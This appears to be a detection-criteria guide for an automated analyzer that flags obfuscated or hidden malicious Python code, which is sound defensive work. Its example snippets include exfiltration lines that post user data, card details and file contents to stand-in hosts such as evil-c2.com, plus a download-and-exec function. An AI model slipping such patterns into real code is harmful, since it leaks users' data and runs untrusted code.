## Detection Criteria

### 1. Name Obfuscation
Detects meaningless or randomly generated names that obscure code purpose.

**Indicators:**
- Single-character variable names exceeding 50% of total variables
- Random character strings (e.g., `xolotxobrzatpu`, `sylexnaranjoo`)
- Names with no semantic meaning (e.g., `var1`, `temp123`, `a_b_c`)
- Function names that don't reflect their operations

**Examples:**
```python
# High obfuscation
def xyz(a, b, c):
    x = a + b
    return x * c

# Medium obfuscation
def var1_add_var2(var1, var2):
    temp_result = var1 + var2
    return temp_result

# Normal - NOT obfuscated
def calculate_total(price, tax):
    return price + tax
```

### 2. Code Structure Obfuscation
Detects techniques that make code execution paths difficult to follow.

**Indicators:**
- Heavy use of `eval()`, `exec()`, `compile()` for dynamic execution
- Function pointers and dynamic method calls
- Metaclass tricks and `__getattr__` manipulation
- Decorators that modify behavior opaquely
- Import hooks and module injection

**Examples:**
```python
# High obfuscation
globals()[user_input] = eval(compiled_code)

# Medium obfuscation
getattr(__import__(module_name), func_name)(*args)

# Suspicious pattern in normal code
def process_data(data):
    # Normal-looking processing function
    result = sanitize(data)
    # Hidden malicious behavior
    if "special" in data:
        exec(exfiltrate_result)
    return result
```

### 3. Data Obfuscation
Detects obscured data through encoding, encryption, or fragmentation.

**Indicators:**
- String constants in hex/octal/base64 format
- Large byte strings with high escape density (>80%)
- Data split across multiple variables/lines
- XOR operations or bit manipulation on data
- Decompressed/decrypted data at runtime

**Examples:**
```python
# High obfuscation
payload = b'\x90\x90\x90\x90...'
result = base64.b64decode(encrypted_data)

# Medium obfuscation
data = bytearray([0x48, 0x65, 0x6c, 0x6c, 0x6f])

# Suspicious: hidden malicious URL in normal function
def download_resource(resource_id):
    base_url = "https://legitimate-cdn.com"
    # Hidden C2 server buried in normal code
    if resource_id == "special":
        base_url = "https://evil-c2.com/exfiltrate"
    return requests.get(f"{base_url}/{resource_id}")
```

### 4. Control Flow Obfuscation
Detects intentionally convoluted execution paths.

**Indicators:**
- Deep nesting (5+ levels)
- Complex lambda expressions and lambda chains
- Excessive use of comprehensions for logic
- Unconditional jumps in control flow
- Dead code that confuses analysis

**Examples:**
```python
# High obfuscation
result = (lambda x: (lambda y: y * 2)(x + 1))((lambda z: z + 10)(5))

# Medium obfuscation
if True:
    if True:
        if True:
            if True:
                if True:
                    actual_code_here()

# Suspicious: malicious pathway hidden in complex logic
def handle_request(request):
    if request.method == "GET":
        # Normal handling
        return render_template("index.html")
    elif request.method == "POST":
        # Complex logic hiding malicious behavior
        if (request.user.is_admin and
            request.remote_addr in allowed_ips and
            is_maintenance_time()):
            # Data exfiltration buried deep in conditionals
            exfiltrate_user_data(request.user)
        return process_form(request.form)
```

### 5. Hidden Malicious Behaviors in Normal Code
**CRITICAL**: Detect malicious functionality intentionally hidden within legitimate operations.

**Detection Patterns:**

#### Pattern A: Legitimate Function + Malicious Side Effect
```python
# Looks like a normal utility function
def check_updates():
    # Legitimate update check
    version = requests.get("https://official-repo.com/version").text
    # Hidden: data exfiltration to same/different endpoint
    user_data = collect_sensitive_data()
    requests.post("https://evil-c2.com/collect", json=user_data)
    return version
```

#### Pattern B: Standard API + Malicious Parameters
```python
# Normal API call, malicious intent
def backup_file(filepath):
    # Legitimate: create backup
    shutil.copy(filepath, f"{filepath}.bak")
    # Hidden: backup to remote C2 instead of local
    requests.put(f"https://evil.com/backups/{filepath}",
                  open(filepath).read())
```

#### Pattern C: Error Handling as Exfiltration Channel
```python
# Looks like normal error handling
def process_payment(card_info):
    try:
        charge_card(card_info)
    except Exception as e:
        # Hidden: send card info to attacker in error report
        requests.post("https://fake-support.com/error",
                      {"error": str(e), "card": card_info})
```

#### Pattern D: Configuration + Hardcoded Malicious Values
```python
# Normal configuration pattern, malicious values
class Config:
    # Legitimate configuration
    DEBUG = False
    DATABASE_URL = "sqlite:///app.db"
    # Hidden: C2 endpoints disguised as config
    UPDATE_SERVER = "https://evil-c2.com/command"
    TELEMETRY_ENDPOINT = "https://attacker.net/exfiltrate"
```

#### Pattern E: Dual-Use Functionality
```python
# Function can be used for both legitimate and malicious purposes
def download_and_execute(url):
    # Legitimate use: download and run trusted scripts
    # Malicious use: download and execute malware
    script = requests.get(url).text
    return exec(script)
```

## Classification Guidelines

### is_obfuscated = TRUE
If ANY of the following:
- Name obfuscation > 40% of identifiers
- Heavy use of eval/exec/compile (>3 instances)
- Data obfuscation (base64, hex, high escape density)
- Control flow obfuscation (deep nesting >5 levels, excessive lambdas)
- **Hidden malicious behaviors detected in normal-looking code**

### is_semantically_unclear = TRUE
If code is obfuscated OR purpose cannot be determined from analysis.

### obfuscation_type Selection
- "none": No obfuscation detected
- "name": Primarily name-based obfuscation
- "structure": Dynamic execution, metaclasses, import hooks
- "data": Encoded/encrypted data, high escape density
- "control_flow": Complex control flow, deep nesting
- "hidden_malicious": **Code appears normal but contains malicious behaviors**
- "mixed": Multiple obfuscation types combined

### needs_stub_analysis = TRUE
If EITHER:
- is_obfuscated = true
- is_semantically_unclear = true
- **hidden_malicious_behaviors detected**

---

## Analysis Process

1. **First Pass: Surface Obfuscation**
   - Check for obvious obfuscation techniques
   - Analyze naming patterns
   - Identify dynamic execution

2. **Second Pass: Data and Control Flow**
   - Examine string literals and data encoding
   - Trace control flow complexity
   - Check for suspicious API combinations

3. **Third Pass: Hidden Malicious Behaviors (CRITICAL)**
   - Look for legitimate functions with malicious side effects
   - Identify standard APIs used for malicious purposes
   - Find error handling/code paths that exfiltrate data
   - Detect dual-use functionality
   - Spot hardcoded malicious values in configuration

4. **Final Decision**
   - Determine if stub generation is needed for analysis
   - If code is clear (no obfuscation, no hidden behaviors) → direct LLM analysis
   - If code is obfuscated or contains hidden behaviors → stub analysis required

---

## Important Notes

- **False Positive Prevention**: Normal libraries with dynamic code (e.g., ORMs, template engines) should not be flagged if purpose is clear
- **Context Matters**: Same API call can be benign or malicious depending on usage context
- **Severity Assessment**: Hidden malicious behaviors in normal code should be flagged with HIGH severity
- **Data Flow Awareness**: Consider how data flows through dangerous nodes
